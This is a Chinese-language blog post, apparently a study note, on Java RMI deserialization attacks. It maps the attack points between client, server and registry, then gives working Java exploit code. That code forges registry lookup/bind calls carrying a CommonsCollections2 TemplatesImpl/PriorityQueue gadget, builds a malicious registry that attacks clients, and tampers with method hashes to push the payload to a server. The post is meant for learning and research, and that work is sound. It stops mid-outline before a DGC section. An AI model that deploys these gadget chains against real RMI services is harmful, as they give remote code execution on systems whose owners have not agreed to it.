参考文章

[RMI反序列化漏洞之三顾茅庐-攻击实现](https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/)

[RMI反序列化初探](https://cn-sec.com/archives/1591525.html)



所有的反序列化攻击都需要被攻击方本地存在gadget，RMI反序化可以作为利用链的入口。

# 攻击思路

## 攻击客户端

RegistryImpl_Stub#lookup->注册中心攻击客户端

StreamRemoteCall#executeCall->服务端/注册中心攻击客户端

UnicastRef#invoke->服务端攻击客户端

## 攻击服务端

UnicastServerRef#dispatch->客户端攻击服务端

## 攻击注册中心

RegistryImpl_Skel#dispatch->客户端/服务端攻击注册中心

# 攻击实现

## 客户端/服务端攻击注册中心

在流程分析文章中已经分析过，客户端调用了RegistryImpl_Stub里面的lookup方法。其实服务端绑定也是调用的RegistryImpl_Stub里面的bind方法，由于流程分析文章中我们的服务端和注册中心在一个JVM中运行，绑定时直接调用本地的RegistryImpl的方法。

当注册中心在远程服务器上时，对注册中心来说并没有具体区分客户端和服务端。

在流程分析中，也分析了注册中心的攻击点，Registryimpl_Skel#dispatch，最终调用到了lookup方法。

```java
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
    try {
        RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

        try {
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(var1);
        } catch (IOException var18) {
            throw new MarshalException("error marshalling arguments", var18);
        }

        super.ref.invoke(var2);  //攻击点 //对var2进行修改利用  //将传过来的lookup参数反序列化
```

而我们知道写好的lookup函数参数类型是String类型。所以这里要自己实现一个lookup把而因对象发过去。注意在服务端添加CC依赖。我下面的代码打的是CC2

```java
public class RegisteryExploit {
    public static void main(String[] args) throws Exception {
        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry("127.0.0.1", 1099); //创建
        //loopkup(registry);
        bind(registry);
    }



    public static void loopkup(RegistryImpl_Stub registry) throws Exception {
        Class<?> superclass = registry.getClass().getSuperclass().getSuperclass();//反射调用实现 默认lookupzhongde super.ref
        Field ref1 = superclass.getDeclaredField("ref");
        ref1.setAccessible(true);
        RemoteRef ref = (RemoteRef) ref1.get(registry);  //反射调用ref //之后模拟lookup

        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};

        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);

        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(getEvilPriorityQueue());

        ref.invoke(var2);

    }

    public static void bind(RegistryImpl_Stub registry) throws Exception {
        Class<?> superclass = registry.getClass().getSuperclass().getSuperclass();
        Field ref1 = superclass.getDeclaredField("ref");
        ref1.setAccessible(true);
        RemoteRef ref = (RemoteRef) ref1.get(registry);

        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};

        RemoteCall var3 = ref.newCall(registry, operations, 0, 4905912898345647071L);

        ObjectOutput var4 = var3.getOutputStream();
        var4.writeObject(getEvilPriorityQueue());
        var4.writeObject(registry);
        ref.invoke(var3);
    }


    public static PriorityQueue getEvilPriorityQueue() throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());


        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);

        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        return priorityQueue;
    }

}
```

## 注册中心攻击客户端

如果注册中心是攻击者，客户端是正常请求。但是，注册中心返回的不是所请求服务端的Stub，而是我们构造的恶意对象的话，客户端就会被攻击。

实现就是在注册中心绑定一个恶意对象服务。

封装恶意对象是因为bind的第二个参数必须是Remote对象。

还要注意一点是，在客户端进行反序列化时EvilObj会报错（因为客户端没有这个类），但是反序列化从里往外，在报错之前我们的恶意对象被反序列化执行了就可以了。

```java
public class EvilRegistry {
    public static void main(String[] args) throws Exception {
        new RemoteObjImpl();   //如果不发布一个远程对象程序就运行结束了
        Registry registry = LocateRegistry.createRegistry(1099); //创建注册中心
        Remote evilObj = new EvilObj();
        registry.bind("remoteObj", evilObj);   //绑定 第二个参数放恶意对象
    }

    public static PriorityQueue getEvilPriorityQueue() throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());


        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);

        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        return priorityQueue;
    }

}
```

```java
class EvilObj implements Remote, Serializable {
    private PriorityQueue priorityQueue;

    EvilObj() throws Exception {
        this.priorityQueue = getEvilPriorityQueue();
    }

}
```

## 客户端攻击服务端

### 修改mothod

如果前面两个流程是正常进行，之后就是客户端和服务端的交互。也就是现在这个阶段，之前分析了这个阶段的攻击点，是存在反序列化的，但是前提是方法参数不能为基本类型。

```java
protected static Object unmarshalValue(Class<?> type, ObjectInput in) //type是String
    throws IOException, ClassNotFoundException
{
    if (type.isPrimitive()) {  //判断type是不是java的基本类型，String不是java的基本类型则进入else
        if (type == int.class) {
            return Integer.valueOf(in.readInt());
        } else if (type == boolean.class) {
            return Boolean.valueOf(in.readBoolean());
        } else if (type == byte.class) {
            return Byte.valueOf(in.readByte());
        } else if (type == char.class) {
            return Character.valueOf(in.readChar());
        } else if (type == short.class) {
            return Short.valueOf(in.readShort());
        } else if (type == long.class) {
            return Long.valueOf(in.readLong());
        } else if (type == float.class) {
            return Float.valueOf(in.readFloat());
        } else if (type == double.class) {
            return Double.valueOf(in.readDouble());
        } else {
            throw new Error("Unrecognized primitive type: " + type);
        }
    } else {
        return in.readObject();   //反序列化，return HELLO
    }
}
```

所以我们改一下sayHello的参数类型试下，要结合payload所以改为Object类型。

```java
public interface IRemoteObj extends Remote {
    //sayHello就是客户端要调用的方法，需要抛出RemoteException
    public String sayHello(Object keywords) throws RemoteException;
}
```

报错出现在下面位置

```java
public void dispatch(Remote obj, RemoteCall call) throws IOException {
    // positive operation number in 1.1 stubs;
    // negative version number in 1.2 stubs and beyond...
    int num;
    long op;

    try {
        // read remote call header
        ObjectInput in;
        try {
            in = call.getInputStream();
            num = in.readInt();
            if (num >= 0) {
                if (skel != null) {
                    oldDispatch(obj, call, num);
                    return;
                } else {
                    throw new UnmarshalException(
                        "skeleton class not found but required " +
                        "for client version");
                }
            }
            op = in.readLong();
        } catch (Exception readEx) {
            throw new UnmarshalException("error unmarshalling call header",
                                         readEx);
        }

        /*
         * Since only system classes (with null class loaders) will be on
         * the execution stack during parameter unmarshalling for the 1.2
         * stub protocol, tell the MarshalInputStream not to bother trying
         * to resolve classes using its superclasses's default method of
         * consulting the first non-null class loader on the stack.
         */
        MarshalInputStream marshalStream = (MarshalInputStream) in;
        marshalStream.skipDefaultResolveClass();

        Method method = hashToMethod_Map.get(op);  
        if (method == null) {    /////////////抛出异常
            throw new UnmarshalException("unrecognized method hash: " +
                "method not supported by remote object");
        }
```

是因为`Method method = hashToMethod_Map.get(op);`返回的method是null。

这是因为客户端尝试调用的方法与服务端定义的方法不匹配。

我们要想办法在hashToMethod_Map中put进一个key为和服务端定义相匹配的方法。

跟进`remoteObj.sayHello("hello");`，最后在RemoteObjectInvocationHandler#getMethodHash找到控制hashToMethod_Map方法。

```java
private static long getMethodHash(Method method) {
    return methodToHash_Maps.get(method.getDeclaringClass()).get(method);
}
```

攻击的时候，在这打个断点。把method的值修改成sayHello(String.class)。

![image-20240723104035341](https://s2.loli.net/2024/07/23/c2DQx6NferiAGdL.png)

可以看到传进来的mothod为sayHello(Object.class)，我们在下方“Variables”面板中把mothod值修改为

```java
Launcher.AppClassLoader.getSystemClassLoader().loadClass("org.example.IRemoteObj").getDeclaredMethod("sayHello",String.class)
```

用ClassLoader加载会报错，改为AppClassloader就可以了。

找不到sayHello(String.class)也会报错。这里我改了下接口

```java
public interface IRemoteObj extends Remote {
    //sayHello就是客户端要调用的方法，需要抛出RemoteException
    public String sayHello(Object keywords) throws RemoteException;
    public String sayHello(String keywords) throws RemoteException;
}
```

修改后，程序继续运行就可以实现攻击了。

### 调用invoke

除了直接在调试中修改method值，还可以用代码实现。

理一下调用

`remoteObj.sayHello(getEvilPriorityQueue());` 调用代理的invoke

`RemoteObjectInvocationHandler # invoke`     调用

`UnicastRef # invoke    `   看下图

![image-20240723112529271](https://s2.loli.net/2024/07/23/iHDKYO6XvunkjLW.png)



我们控制下method的传值，手动调用`UnicastRef # invoke`就可以了。

```java
public class ServerExploit {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        IRemoteObj remoteObj = (IRemoteObj) registry.lookup("remoteObj");
        //System.out.println(remoteObj);
        //remoteObj.sayHello(getEvilPriorityQueue());
        invoke(remoteObj);
    }

    public static void invoke(IRemoteObj remoteObj) throws Exception {
        //要获得 ref.invoke的四个参数，还有ref
        Field hField = remoteObj.getClass().getSuperclass().getDeclaredField("h");
        //getClass是com.sun.proxy.$Proxy0， getSuperclass()才是java.lang.reflect.Proxy
        hField.setAccessible(true);
        Object remoteObjectInvocationHandler = hField.get(remoteObj);

        Field refField = remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField("ref");
        refField.setAccessible(true);
        UnicastRef ref = (UnicastRef) refField.get(remoteObjectInvocationHandler);

        Method sayHello = IRemoteObj.class.getDeclaredMethod("sayHello", String.class);    //获取hash
        Method getMethodHash = remoteObjectInvocationHandler.getClass().getDeclaredMethod("getMethodHash", Method.class);
        getMethodHash.setAccessible(true);
        long hash = (long) getMethodHash.invoke(remoteObj, sayHello);

        ref.invoke(remoteObj, sayHello, new Object[]{getEvilPriorityQueue()},hash);

    }
```





## 服务端攻击客户端

客户端调用UnicastRef#invoke和服务端交互，如果调用的方法有返回值的会执行到程序会执行到`unmarshalValue(rtype, in);`，对方法的返回值进行反序列化，如果方法的返回值是Object则可以利用。

## DCG相关攻击

先写到这吧